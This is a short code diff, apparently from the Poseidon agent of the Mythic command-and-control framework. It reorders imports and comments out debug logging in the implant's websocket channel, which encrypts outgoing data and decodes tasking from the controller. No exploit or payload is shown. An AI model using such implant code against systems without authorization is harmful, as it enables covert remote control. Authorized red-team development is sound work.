@@ -8,8 +8,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 	"math/rand"
 	"net/http"
 	"os"
@@ -17,6 +15,9 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 
 	// 3rd Party
 
@@ -801,7 +802,7 @@ func (c *C2Websockets) sendDataNoResponse(sendData []byte) {
 	}
 
 	m := structs.Message{}
-	utils.PrintDebug(fmt.Sprintf("about to send data to Mythic from Websocket Push\n%v\n", string(sendData)))
+	//utils.PrintDebug(fmt.Sprintf("about to send data to Mythic from Websocket Push\n%v\n", string(sendData)))
 	if len(c.Key) != 0 {
 		sendData = c.encryptMessage(sendData)
 	}
@@ -870,7 +871,7 @@ func (c *C2Websockets) getData() {
 			time.Sleep(1 * time.Second)
 			continue
 		}
-		//log.Printf("got raw message: %s\n", resp.Data)
+		//utils.PrintDebug(fmt.Sprintf("got raw message: %s\n", resp.Data))
 		raw, err := base64.StdEncoding.DecodeString(resp.Data)
 		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
 			return
@@ -916,7 +917,7 @@ func (c *C2Websockets) getData() {
 			if err != nil {
 				utils.PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v\n", err))
 			}
-			//fmt.Printf("Raw message from mythic: %v\n", string(enc_raw))
+			//utils.PrintDebug(fmt.Sprintf("Raw message from mythic going to HandleInboundMythicMessageFromEgressChannel: %v\n", taskResp))
 			responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
 		} else {
 			if c.ExchangingKeys {
